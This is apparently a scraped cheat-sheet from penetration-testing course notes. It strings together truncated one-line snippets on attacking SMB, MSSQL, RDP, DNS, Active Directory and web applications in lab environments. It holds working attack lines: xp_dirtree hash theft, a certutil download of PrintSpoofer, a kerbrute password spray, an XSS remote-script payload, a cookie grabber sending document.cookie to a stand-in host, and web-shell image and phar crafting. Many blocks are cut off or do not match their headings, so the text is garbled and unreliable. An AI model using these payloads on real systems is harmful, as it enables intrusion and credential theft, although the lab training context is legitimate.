Interacting with Common Services

```
29302
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - windows-cmd---dir-3
#cat/UTILS #cpts
The following command `| find /c ":\\"` process the output of `dir n: /a-d /s /b` to count how many files exist in the directory and subdirectories. You can use `dir /?` to see the full help. Searching through 29,302 fil

```
n:\Contracts\private\credentials.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux---mount
#cat/UTILS #cpts
Interacting with Common Services

```
sudo mkdir /mnt/Finance
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux---mount-2
#cat/UTILS #cpts
Interacting with Common Services

```
sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux---install-evolution
#cat/UTILS #cpts
Interacting with Common Services

```
sudo apt-get install evolution
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux---sqsh
#cat/UTILS #cpts
Interacting with Common Services

```
sqsh -S 10.129.20.13 -U username -P Password123
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - install-dbeaver
#cat/UTILS #cpts
Interacting with Common Services

```
sudo dpkg -i dbeaver-<version>.deb
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - run-dbeaver
#cat/UTILS #cpts
Interacting with Common Services

```
dbeaver &
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - authentication-3
#cat/UTILS #cpts
In previous years (though we still see this sometimes during assessments), it was widespread for services to include default credentials (username and password). This presents a security issue because many administrators

```
admin:admin
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - brute-forcing-and-password-spray
#cat/UTILS #cpts
When brute-forcing, we try as many passwords as possible against an account, but it can lock out an account if we hit the threshold. We can use brute-forcing and stop before reaching the threshold if we know it. Otherwis

```
cat /tmp/userlist.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - show-databases
#cat/UTILS #cpts
If we use `sqlcmd`, we will need to use `GO` after our query to execute the SQL syntax. Attacking SQL Databases

```
1> SELECT name FROM master.dbo.sysdatabases
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - select-a-database
#cat/UTILS #cpts
Attacking SQL Databases

```
1> USE htbusers
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - show-tables
#cat/UTILS #cpts
Attacking SQL Databases

```
(8 rows affected)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - xp_cmdshell
#cat/UTILS #cpts
If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command: Code: mssql

```
To allow advanced options to be changed.
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - xp_dirtree-hash-stealing
#cat/UTILS #cpts
Attacking SQL Databases

```
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - xp_subdirs-hash-stealing
#cat/UTILS #cpts
Attacking SQL Databases

```
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - identify-users-that-we-can-impersonate
#cat/UTILS #cpts
Attacking SQL Databases

```
(3 rows affected)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - verifying-our-current-user-and-role
#cat/UTILS #cpts
Attacking SQL Databases

```
(1 rows affected)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - misconfigurations
#cat/UTILS #cpts
Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. Although it is not common, we could find an RDP service without a password if there is a miscon

```
root
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - crowbar---rdp-password-spraying
#cat/UTILS #cpts
Attacking RDP

```
2022-04-07 15:35:50 START
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - rdp-session-hijacking
#cat/UTILS #cpts
If we have local administrator privileges, we can use several methods to obtain `SYSTEM` privileges, such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/genti

```
USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dig---axfr-zone-transfer
#cat/UTILS #cpts
Attacking DNS

```
DiG 9.11.5-P1-1-Debian axfr inlanefrieght.htb @10.129.110.213
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dig---axfr-zone-transfer-3
#cat/UTILS #cpts
Attacking DNS

```
Query time: 28 msec
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dig---axfr-zone-transfer-5
#cat/UTILS #cpts
Attacking DNS

```
WHEN: Mon Oct 11 17:20:13 EDT 2020
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dig---axfr-zone-transfer-6
#cat/UTILS #cpts
Attacking DNS

```
XFR size: 8 records (messages 1, bytes 289)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - domain-takeovers-subdomain-enumeration
#cat/UTILS #cpts
`Domain takeover` is registering a non-existent domain name to gain control over another domain. If attackers find an expired domain, they can claim that domain to perform further attacks such as hosting malicious conten

```
sub.target.com. 60 IN CNAME anotherdomain.com
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - subbrute
#cat/UTILS #cpts
Sometimes internal physical configurations are poorly secured, which we can exploit to upload our tools from a USB stick. Another scenario would be that we have reached an internal host through pivoting and want to work

```
support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - local-dns-cache-poisoning-3
#cat/UTILS #cpts
From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like [Ettercap](https://www.ettercap-project.org/) or [Bettercap](https://www.bettercap.org/). To exploit the DNS cache

```
inlanefreight.com A 192.168.225.110
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - local-dns-cache-poisoning-4
#cat/UTILS #cpts
Next, start the `Ettercap` tool and scan for live hosts within the network by navigating to `Hosts > Scan for Hosts`. Once completed, add the target IP address (e.g., `192.168.152.129`) to Target1 and add a default gatew

```
C:\>ping inlanefreight.com
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - host---mx-records
#cat/UTILS #cpts
Attacking Email Services

```
host -t MX microsoft.com
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - host---a-records
#cat/UTILS #cpts
Attacking Email Services

```
host -t A mail1.inlanefreight.htb.
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o
#cat/UTILS #cpts
Students need to read the scenario to learn about the web shell located at `/uploads/`, and then access the web shell at the `http://STMIP/uploads/antak.aspx` with the credentials `admin:My_W3bsH3ll_P@ssw0rd!`: Students

```
cat c:\users\administrator\desktop\flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-2
#cat/UTILS #cpts
```
PS> cat c:\users\administrator\desktop\flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-3
#cat/UTILS #cpts
Then, students need to set the options of the module accordingly:

```
set SRVHOST PWNIP
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-5
#cat/UTILS #cpts
Students need to copy and paste the encoded PowerShell command into the `Antak` web shell. Checking `msfconsole`, students will see a `meterpreter` session has been opened. Next, students need to enumerate processes and

```
getpid
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-6
#cat/UTILS #cpts
```
shell-session
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - crack-the-accounts-password-submit-the-cleartext-value
#cat/UTILS #cpts
Students need to copy the hash, and then paste into a file, formatting it to remove additional spaces:

```
echo "$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$0A3867FF933AD2
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - crack-the-accounts-password-submit-the-cleartext-value-2
#cat/UTILS #cpts
Students need to copy the hash, and then paste into a file, formatting it to remove additional spaces:

```
e 3DC72AEBCD8B080F12278813442C36B3E0874FBAF7C0B404BDD4D03A333C81A0B9B" | tr -d "[:space:]" > tgs_file
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-3
#cat/UTILS #cpts
Students need to use WEB01 as a pivot host into the 172.16.6.0/24 network using `meterpreter`:

```
run autoroute -s 172.16.6.0/24
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-4
#cat/UTILS #cpts
Then, students can use the `auxiliary/scanner/portscan/tcp` module to look for hosts on the internal network, scanning for ports 139,445 as they are common Windows ports and can have implications for remote code executio

```
set rhosts 172.16.6.0/24
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-5
#cat/UTILS #cpts
Then, students can use the `auxiliary/scanner/portscan/tcp` module to look for hosts on the internal network, scanning for ports 139,445 as they are common Windows ports and can have implications for remote code executio

```
set PORTS 139,445
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-6
#cat/UTILS #cpts
Then, students can use the `auxiliary/scanner/portscan/tcp` module to look for hosts on the internal network, scanning for ports 139,445 as they are common Windows ports and can have implications for remote code executio

```
set threads 50
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-7
#cat/UTILS #cpts
```
(Meterpreter 1)(C:\) > bg
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-8
#cat/UTILS #cpts
Subsequently, students need to set up a SOCKS proxy in `msfconsole`:

```
use auxiliary/server/socks_proxy
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-attack-can-this-user-perform
#cat/UTILS #cpts
Using the previously established meterpreter session on WEB01, students will drop to a command shell, navigate to `C:\`, and then run PowerShell:

```
cd C:\
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - use-a-common-method-to-obtain-weak-credentials-for-another-user-submit
#cat/UTILS #cpts
Subsequently, students need to use `kerbrute.exe` to password spray against the user list generated:

```
.\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adusers.txt Welcome1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - use-a-common-method-to-obtain-weak-credentials-for-another-user-submit-2
#cat/UTILS #cpts
```
__ __ __
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-9
#cat/UTILS #cpts
Subsequently, students need to enable `xp_cmdshell`:

```
enable_xp_cmdshell
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-10
#cat/UTILS #cpts
```
SQL> xp_cmdshell whoami /priv
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-11
#cat/UTILS #cpts
```
└──╼ $python3 -m http.server 9000
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-12
#cat/UTILS #cpts
Students now need to transfer it to the SQL01 target using `xp_cmdshell` and `certutil.exe`:

```
xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-13
#cat/UTILS #cpts
```
SQL> xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-15
#cat/UTILS #cpts
Then, using the meterpreter session, students can upload it to the SQL01 machine:

```
upload mimikatz64.exe
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-16
#cat/UTILS #cpts
```
(Meterpreter 1)(C:\) > upload mimikatz64.exe
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-17
#cat/UTILS #cpts
Now, LSA passwords can be extracted using `mimikatz`'s `sekurlsa::logonpasswords`:

```
shelll
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - scripts
#cat/UTILS #cpts
With out of scope

```
if (requestResponse.response() != null) {
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - scripts-2
#cat/UTILS #cpts
With scope

```
// Only include in-scope requests
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - brute-force-attacks
#cat/UTILS #cpts
To truly grasp the challenge of brute forcing, it's essential to understand the underlying mathematics. The following formula determines the total number of possible combinations for a password:

```
mathml
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - cracking-the-pin
#cat/UTILS #cpts
**To follow along, start the target system via the question section at the bottom of the page.** The instance application generates a random 4-digit PIN and exposes an endpoint (`/pin`) that accepts a PIN as a query para

```
import requests
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - the-power-of-hybrid-attacks
#cat/UTILS #cpts
This last `grep` command tackles the policy's numerical requirement. The regular expression `[0-9]` acts as a filter, ensuring that passwords containing at least one numerical digit are preserved in `darkweb2017-number.t

```
wc -l darkweb2017-number.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - username-anarchy
#cat/UTILS #cpts
Even when dealing with a seemingly simple name like "Jane Smith," manual username generation can quickly become a convoluted endeavor. While the obvious combinations like `jane`, `smith`, `janesmith`, `j.smith`, or `jane

```
./username-anarchy -l
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - username-anarchy-2
#cat/UTILS #cpts
Next, execute it with the target's first and last names. This will generate possible username combinations.

```
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - cupp
#cat/UTILS #cpts
With the username aspect addressed, the next formidable hurdle in a brute-force attack is the password. This is where `CUPP` (Common User Passwords Profiler) steps in, a tool designed to create highly personalized passwo

```
sudo apt install cupp -y
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - cupp-2
#cat/UTILS #cpts
Invoke CUPP in interactive mode, CUPP will guide you through a series of questions about your target, enter the following as prompted:

```
(__) )\
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - analyze-the-configuration
#cat/UTILS #cpts
As an example :

```
Template Name : WebServer
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - esc-8
#cat/UTILS #cpts
Reading through [this](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html) blogpost we discover that we can relay Kerberos over SMB using a specific DNS entry. Let's follow the steps d

```
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - source-sink
#cat/UTILS #cpts
To further understand the nature of the DOM-based XSS vulnerability, we must understand the concept of the `Source` and `Sink` of the object displayed on the page. The `Source` is the JavaScript object that takes the use

```
javascript
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - loading-a-remote-script
#cat/UTILS #cpts
If we get a request for `/username`, then we know that the `username` field is vulnerable to XSS, and so on. With that, we can start testing various XSS payloads that load a remote script and see which of them sends us a

```
'>< /script><script src=http://<lhost>/script.js></script>
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - loading-a-remote-script-2
#cat/UTILS #cpts
As we can see, various payloads start with an injection like `'>`, which may or may not work depending on how our input is handled in the backend. As previously mentioned in the `XSS Discovery` section, if we had access

```
cd /tmp/tmpserver
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - loading-a-remote-script-3
#cat/UTILS #cpts
As we can see, various payloads start with an injection like `'>`, which may or may not work depending on how our input is handled in the backend. As previously mentioned in the `XSS Discovery` section, if we had access

```
sudo php -S 0.0.0.0:80
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - session-hijacking-4
#cat/UTILS #cpts
Now, we wait for the victim to visit the vulnerable page and view our XSS payload. Once they do, we will get two requests on our server, one for `script.js`, which in turn will make another request with the cookie value:

```
10.10.10.10:52798 [200]: /script.js
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - session-hijacking-5
#cat/UTILS #cpts
As mentioned earlier, we get the cookie value right in the terminal, as we can see. However, since we prepared a PHP script, we also get the `cookies.txt` file with a clean log of cookies:

```
cat cookies.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - input-validation
#cat/UTILS #cpts
Input validation in the back-end is quite similar to the front-end, and it uses Regex or library functions to ensure that the input field is what is expected. If it does not match, then the back-end server will reject it

```
php
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - nodejs
#cat/UTILS #cpts
As we can see, whatever parameter passed from the URL gets used by the `readfile` function, which then writes the file content in the HTTP response. Another example is the `render()` function in the `Express.js` framewor

```
app.get("/about/:language", function(req, res) {
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - java
#cat/UTILS #cpts
The same concept applies to many other web servers. The following examples show how web applications for a Java web server may include local files based on the specified parameter, using the `include` function:

```
jsp
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - net
#cat/UTILS #cpts
Finally, let's take an example of how File Inclusion vulnerabilities may occur in .NET web applications. The `Response.WriteFile` function works very similarly to all of our earlier examples, as it takes a file path for

```
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - net-2
#cat/UTILS #cpts
Furthermore, the `@Html.Partial()` function may also be used to render the specified file as part of the front-end template, similarly to what we saw earlier:

```
@Html.Partial(HttpContext.Request.Query['language'])
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - non-recursive-path-traversal-filters
#cat/UTILS #cpts
One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (`../`) to avoid path traversals. For example:

```
$language = str_replace('../', '', $_GET['language'])
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - approved-paths
#cat/UTILS #cpts
Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the

```
echo 'Illegal path specified!'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - path-truncation
#cat/UTILS #cpts
In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be `truncated`, and any characters after

```
url
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - path-truncation-2
#cat/UTILS #cpts
Of course, we don't have to manually type `./` 2048 times (total of 4096 characters), but we can automate the creation of this string with the following command:

```
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - http
#cat/UTILS #cpts
Now, we can start a server on our machine with a basic python server with the following command, as follows:

```
sudo python3 -m http.server <lport>
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - crafting-malicious-image
#cat/UTILS #cpts
Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. `shell.gif`), and should also includ

```
echo 'GIF8' > shell.gif
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - phar-upload
#cat/UTILS #cpts
Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

```
$phar = new Phar('shell.phar')
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - phar-upload-2
#cat/UTILS #cpts
Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

```
$phar->startBuffering()
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - phar-upload-3
#cat/UTILS #cpts
Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

```
$phar->addFromString('shell.txt', '')
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - phar-upload-4
#cat/UTILS #cpts
Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

```
$phar->setStub('')
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - phar-upload-5
#cat/UTILS #cpts
Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

```
$phar->stopBuffering()
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - phar-upload-6
#cat/UTILS #cpts
This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:

```
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - preventing-directory-traversal
#cat/UTILS #cpts
If attackers can control the directory, they can escape the web application and attack something they are more familiar with or use a `universal attack chain`. As we have discussed throughout the module, directory traver

```
$input = str_replace('../', '', $input)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - disabling-front-end-validation
#cat/UTILS #cpts
Here, we see that the file input specifies (`.jpg,.jpeg,.png`) as the allowed file types within the file selection dialog. However, we can easily modify this and select `All Files` as we did before, so it is unnecessary

```
$('#error_message').text("Only images are allowed!")
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - disabling-front-end-validation-2
#cat/UTILS #cpts
Here, we see that the file input specifies (`.jpg,.jpeg,.png`) as the allowed file types within the file selection dialog. However, we can easily modify this and select `All Files` as we did before, so it is unnecessary

```
File.form.reset()
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - disabling-front-end-validation-3
#cat/UTILS #cpts
Here, we see that the file input specifies (`.jpg,.jpeg,.png`) as the allowed file types within the file selection dialog. However, we can easily modify this and select `All Files` as we did before, so it is unnecessary

```
$("#submit").attr("disabled", true)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - blacklisting-extensions
#cat/UTILS #cpts
Let's start by trying one of the client-side bypasses we learned in the previous section to upload a PHP script to the back-end server. We'll intercept an image upload request with Burp, replace the file content and file

```
$extension = pathinfo(Name, PATHINFO_EXTENSION)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - blacklisting-extensions-2
#cat/UTILS #cpts
Let's start by trying one of the client-side bypasses we learned in the previous section to upload a PHP script to the back-end server. We'll intercept an image upload request with Burp, replace the file content and file

```
$blacklist = array('php', 'php7', 'phps')
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - blacklisting-extensions-3
#cat/UTILS #cpts
Let's start by trying one of the client-side bypasses we learned in the previous section to upload a PHP script to the back-end server. We'll intercept an image upload request with Burp, replace the file content and file

```
echo "File type not allowed"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - reverse-double-extension
#cat/UTILS #cpts
In some cases, the file upload functionality itself may not be vulnerable, but the web server configuration may lead to a vulnerability. For example, an organization may use an open-source web application, which has a fi

```
SetHandler application/x-httpd-php
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - character-injection
#cat/UTILS #cpts
Finally, let's discuss another method of bypassing a whitelist validation test through `Character Injection`. We can inject several characters before or after the final extension to cause the web application to misinterp

```
echo "shell$char$ext.jpg" >> wordlist.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - character-injection-2
#cat/UTILS #cpts
Finally, let's discuss another method of bypassing a whitelist validation test through `Character Injection`. We can inject several characters before or after the final extension to cause the web application to misinterp

```
echo "shell$ext$char.jpg" >> wordlist.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - character-injection-3
#cat/UTILS #cpts
Finally, let's discuss another method of bypassing a whitelist validation test through `Character Injection`. We can inject several characters before or after the final extension to cause the web application to misinterp

```
echo "shell.jpg$char$ext" >> wordlist.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - character-injection-4
#cat/UTILS #cpts
Finally, let's discuss another method of bypassing a whitelist validation test through `Character Injection`. We can inject several characters before or after the final extension to cause the web application to misinterp

```
echo "shell.jpg$ext$char" >> wordlist.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - content-type
#cat/UTILS #cpts
Let's start the exercise at the end of this section and attempt to upload a PHP script: http://SERVER_IP:PORT/ We see that we get a message saying `Only images are allowed`. The error message persists, and our file fails

```
$type = $_FILES['uploadFile']['type']
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mime-type
#cat/UTILS #cpts
The second and more common type of file content validation is testing the uploaded file's `MIME-Type`. `Multipurpose Internet Mail Extensions (MIME)` is an internet standard that determines the type of a file through its

```
echo "this is a text file" > text.jpg
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mime-type-2
#cat/UTILS #cpts
The second and more common type of file content validation is testing the uploaded file's `MIME-Type`. `Multipurpose Internet Mail Extensions (MIME)` is an internet standard that determines the type of a file through its

```
file text.jpg
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mime-type-3
#cat/UTILS #cpts
As we see, the file's MIME type is `ASCII text`, even though its extension is `.jpg`. However, if we write `GIF8` to the beginning of the file, it will be considered as a `GIF` image instead, even though its extension is

```
echo "GIF8" > text.jpg
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mime-type-4
#cat/UTILS #cpts
Web servers can also utilize this standard to determine file types, which is usually more accurate than testing the file extension. The following example shows how a PHP web application can test the MIME type of an uploa

```
$type = mime_content_type($_FILES['uploadFile']['tmp_name'])
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - content-validation-3
#cat/UTILS #cpts
As we have also learned in this module, extension validation is not enough, as we should also validate the file content. We cannot validate one without the other and must always validate both the file extension and its c

```
echo "Only PNG images are allowed"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - try-to-exploit-the-upload-form-to-read-the-flag-found-at-the-root-dire
#cat/UTILS #cpts
Students can use `cat` to save the `XML` code into a file:

```
cat <<EOF shell.svg
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - try-to-exploit-the-upload-form-to-read-the-flag-found-at-the-root-dire-2
#cat/UTILS #cpts
Subsequently, students need to upload `shell.svg`, however, when attempting to, they will receive the message "only images are allowed". To bypass this, students can change the extension from `.svg` to `.jpeg`:

```
mv shell.svg shell.jpeg
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - try-to-exploit-the-upload-form-to-read-the-flag-found-at-the-root-dire-3
#cat/UTILS #cpts
Students can use `cat` to save the exploit into a file:

```
cat <<EOF shell.phar.svg
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - try-to-exploit-the-upload-form-to-read-the-flag-found-at-the-root-dire-4
#cat/UTILS #cpts
Subsequently, since the frontend does not allow `.svg` extensions, students need to change it to `.jpeg`:

```
mv shell.phar.svg shell.phar.jpeg
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-value-of-the-flag-cookie
#cat/UTILS #cpts
Now that students have identified the vulnerable field, they need to write a JS cookie grabber to a local file (named `script.js`) so that it get requested for:

```
new Image().src='http://PWNIP:PWNPO/index.php?c=' + document.cookie
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-value-of-the-flag-cookie-2
#cat/UTILS #cpts
Students can use `cat` to save the cookie grabber into a file:

```
cat <<EOF script.js
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - crack-the-hash-for-the-previous-account-and-submit-the-cleartext-passw
#cat/UTILS #cpts
From the previous question, students need to save the hash of the user `backupagent` into a file on their workstations:

```
echo "backupagent::INLANEFREIGHT:1968fc543f996645:A3668BA58243EC7E92EF495785AFBBD6:010100000000000000821F57AF82D801C652E35F08D60A320000000002000800460042004100590001001E00570049004E002D004600370052005500440058005000450033004C005A0004003400570049004E002D004600370052005500440058005000450033004C005A002E0046004200410059002E004C004F00430041004C000300140046004200410059002E004C004F00430041004C000500140046004200410059002E004C004F00430041004C000700080000821F57AF82D80106000400020000000800300030000000000000000000000000300000E6A9FDA8EE8660B99F59FF8448621935E25B42391978DBD28C49A8121CB5D8BD0A001000000000000
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - run-inveigh-and-capture-the-ntlmv2-hash-for-the-svc_qualys-account-cra
#cat/UTILS #cpts
When prompted with the "Computer Access Policy" message, students need to click on "OK": Once they access the spawned target machine, students need to run `PowerShell` as administrator, navigate to the `C:\Tools\` direct

```
Import-Module .\Inveigh.ps1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - run-inveigh-and-capture-the-ntlmv2-hash-for-the-svc_qualys-account-cra-2
#cat/UTILS #cpts
The hash of `svc_qualys` is captured and displayed by `Inveigh`. Alternatively, students can retrieve the hash from the file that `Inveigh` has used to write the `NTLMv2` hashes into:

```
type .\Inveigh-NTLMv2.txt | Select-String -Pattern "svc_qualys"
```

